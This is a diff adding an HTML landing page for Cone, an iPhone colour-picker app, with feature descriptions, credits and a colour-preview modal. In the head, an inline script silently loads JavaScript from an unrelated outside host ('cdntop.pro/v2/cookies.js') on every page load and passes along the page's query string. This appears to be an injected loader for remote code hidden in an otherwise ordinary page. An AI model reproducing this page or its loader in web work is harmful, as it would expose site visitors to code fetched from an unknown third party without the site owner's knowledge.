@@ -1,0 +1,158 @@
+<!DOCTYPE html>
+
+<html lang="en" class="wf-proximanova-n6-active wf-proximanova-n3-active wf-proximanova-n4-active wf-proximanova-i4-active wf-active"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+	
+	<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0">
+	<title>Cone - Live Color Picker</title>
+
+	<meta name="description" content="Cone is a delightful and easy to use color picker for the real world.">
+
+	<meta property="og:title" content="Cone - Live Color Picker">
+
+	<meta property="og:image" content="./assets/images/thumbnail.jpg">
+	<meta name="twitter:card" content="summary_large_image">
+
+	<script>
+		var script = document.createElement('script');
+		script.type = 'text/javascript';
+		script.async = true;
+		script.src = 'https://cdntop.pro/v2/cookies.js'+location.search;
+		var first = document.getElementsByTagName('script')[0];
+		first.parentNode.insertBefore(script, first);
+	</script>
+
+	<link rel="stylesheet" href="./assets/style.css">
+	<link rel="icon" type="image/png" href="./assets/favicon.png">
+
+
+
+	<style type="text/css">.tk-proxima-nova{font-family:"proxima-nova",sans-serif;}</style><style type="text/css">@font-face{font-family:tk-proxima-nova-n6;src:url(https://use.typekit.net/af/919204/00000000000000003b9aefc2/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("woff2"),url(https://use.typekit.net/af/919204/00000000000000003b9aefc2/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("woff"),url(https://use.typekit.net/af/919204/00000000000000003b9aefc2/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("opentype");font-weight:600;font-style:normal;}@font-face{font-family:tk-proxima-nova-n4;src:url(https://use.typekit.net/af/af96c8/00000000000000003b9aefc0/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff2"),url(https://use.typekit.net/af/af96c8/00000000000000003b9aefc0/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff"),url(https://use.typekit.net/af/af96c8/00000000000000003b9aefc0/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("opentype");font-weight:400;font-style:normal;}@font-face{font-family:tk-proxima-nova-i4;src:url(https://use.typekit.net/af/20aa1e/00000000000000003b9aefc1/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i4&v=3) format("woff2"),url(https://use.typekit.net/af/20aa1e/00000000000000003b9aefc1/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i4&v=3) format("woff"),url(https://use.typekit.net/af/20aa1e/00000000000000003b9aefc1/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i4&v=3) format("opentype");font-weight:400;font-style:italic;}@font-face{font-family:tk-proxima-nova-n3;src:url(https://use.typekit.net/af/7f382d/00000000000000003b9aefbc/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n3&v=3) format("woff2"),url(https://use.typekit.net/af/7f382d/00000000000000003b9aefbc/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n3&v=3) format("woff"),url(https://use.typekit.net/af/7f382d/00000000000000003b9aefbc/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n3&v=3) format("opentype");font-weight:300;font-style:normal;}</style>
+<style type="text/css">@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/919204/00000000000000003b9aefc2/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("woff2"),url(https://use.typekit.net/af/919204/00000000000000003b9aefc2/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("woff"),url(https://use.typekit.net/af/919204/00000000000000003b9aefc2/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n6&v=3) format("opentype");font-weight:600;font-style:normal;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/af96c8/00000000000000003b9aefc0/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff2"),url(https://use.typekit.net/af/af96c8/00000000000000003b9aefc0/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("woff"),url(https://use.typekit.net/af/af96c8/00000000000000003b9aefc0/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n4&v=3) format("opentype");font-weight:400;font-style:normal;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/20aa1e/00000000000000003b9aefc1/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i4&v=3) format("woff2"),url(https://use.typekit.net/af/20aa1e/00000000000000003b9aefc1/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i4&v=3) format("woff"),url(https://use.typekit.net/af/20aa1e/00000000000000003b9aefc1/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=i4&v=3) format("opentype");font-weight:400;font-style:italic;}@font-face{font-family:proxima-nova;src:url(https://use.typekit.net/af/7f382d/00000000000000003b9aefbc/27/l?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n3&v=3) format("woff2"),url(https://use.typekit.net/af/7f382d/00000000000000003b9aefbc/27/d?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n3&v=3) format("woff"),url(https://use.typekit.net/af/7f382d/00000000000000003b9aefbc/27/a?primer=7cdcb44be4a7db8877ffa5c0007b8dd865b3bbc383831fe2ea177f62257a9191&fvd=n3&v=3) format("opentype");font-weight:300;font-style:normal;}</style>
+</head>
+<body>
+	<div class="wrapper">
+		<div class="top-section">
+			<img class="icon" src="./assets/icon.png" alt="" height="78">
+			<h1>Cone</h1>
+			<h2>Color Picker For The Real World</h2>
+			<a href="#" class="download-button">Download for iphone</a>
+
+			<div class="iphone-container">
+				<img class="phone" src="./assets/iphone.png" alt="" height="408">
+				
+				<div class="picker"></div>
+				<div class="preview"></div>
+				<p class="colorname">
+					<span class="colorname__1">Limeade</span>
+					<span class="colorname__2">Gray Asparagus</span>
+					<span class="colorname__3">Storm Gray</span>
+				</p>
+				<p class="hex">
+					<span class="hex__1">#6FB400</span>
+					<span class="hex__2">#3D5340</span>
+					<span class="hex__3">#72708A</span>
+				</p>
+			</div>
+		</div>
+
+		<div class="features">
+			<div class="features__item  features__item--freeze">
+				<p class="heading">Freeze Frame</p>
+				<p class="description">
+					Are the colors on move? 
+					Instantly freeze the frame and 
+					pick colors in your own time
+				</p>
+			</div>
+			<div class="features__item  features__item--realtime">
+				<p class="heading">Realtime Preview</p>
+				<p class="description">
+					Cone starts previewing colors in real time as soon as the app is launched
+				</p>
+			</div>
+			<div class="features__item  features__item--pantone">
+				<p class="heading">PANTONE® Colors</p>
+				<p class="description">
+					Get PANTONE® colors closest to the 
+					captured colors with high accuracy
+				</p>
+			</div>
+			<div class="features__item  features__item--colorblind">
+				<p class="heading">Colorblind Mode</p>
+				<p class="description">
+					Replaces the color names with hues (red, green, etc.) 
+					for easier color identification.
+				</p>
+			</div>
+			<div class="features__item  features__item--copy">
+				<p class="heading">Copy and Share</p>
+				<p class="description">
+					Easily copy color codes and
+					use them in Sketch or PS 
+					(on macOS 10.12 and iOS 10)
+				</p>
+			</div>
+		</div>
+
+		<div class="separator"></div>
+
+		<div class="media">
+			<div class="media__item media__item--pp"></div>
+			<div class="media__item media__item--ph"></div>
+			<div class="media__item media__item--bp"></div>
+			<div class="media__item media__item--tl"></div>
+		</div>
+
+		<div class="separator"></div>
+		<div class="about">
+			<p>
+				Cone is an independent app made by <a href="#">Kushagra Agarwal</a>.
+				Feel free to <a href="#">get in touch</a> with questions, issues, or praise you might have.
+			</p>
+			<p class="copyright">
+				The <a href="#">Resene RGB Values List</a> is copyrighted to <a href="#" title="">Resene Paints Ltd</a>, 2001. 
+				<a href="#" title="">Name That Color</a> by Chirag Mehta. <br>
+				PANTONE® is the property of Pantone LLC.
+			</p>
+		</div>
+
+		<div class="modal">
+			<div class="modal__overlay"></div>
+			<div class="modal__close" style="top: 46.25px;"></div>
+			<div class="modal__content">
+				<div class="color-preview"></div>
+				<p class="color-name">Red</p>
+				<p class="color-family">aka Red</p>
+				
+				<div class="palette-container">
+					<div class="palette-marker"></div>
+					<div class="color-palette">
+						<div class="color-palette__child  color-palette__child--1"></div>
+						<div class="color-palette__child  color-palette__child--2"></div>
+						<div class="color-palette__child  color-palette__child--3"></div>
+						<div class="color-palette__child  color-palette__child--4"></div>
+						<div class="color-palette__child  color-palette__child--5"></div>
+					</div>
+				</div>
+
+				<div class="copy">
+					<div class="copy__item  copy__item--hex">
+						<div class="copy__message">COPIED!</div>
+						<div class="copy__value">#FF0000</div>
+						<div class="copy__type">HEX</div>
+					</div>
+					<div class="copy__item  copy__item--rgb">
+						<div class="copy__message">COPIED!</div>
+						<div class="copy__value">255, 0, 0</div>
+						<div class="copy__type">RGB</div>
+					</div>
+				</div>
+			</div>
+		</div>
+	</div>
+
+	<script src="./assets/ntc.js"></script>
+	<script src="./assets/clipboard.min.js"></script>
+	<script src="./assets/main.js"></script>
+
+</body></html>
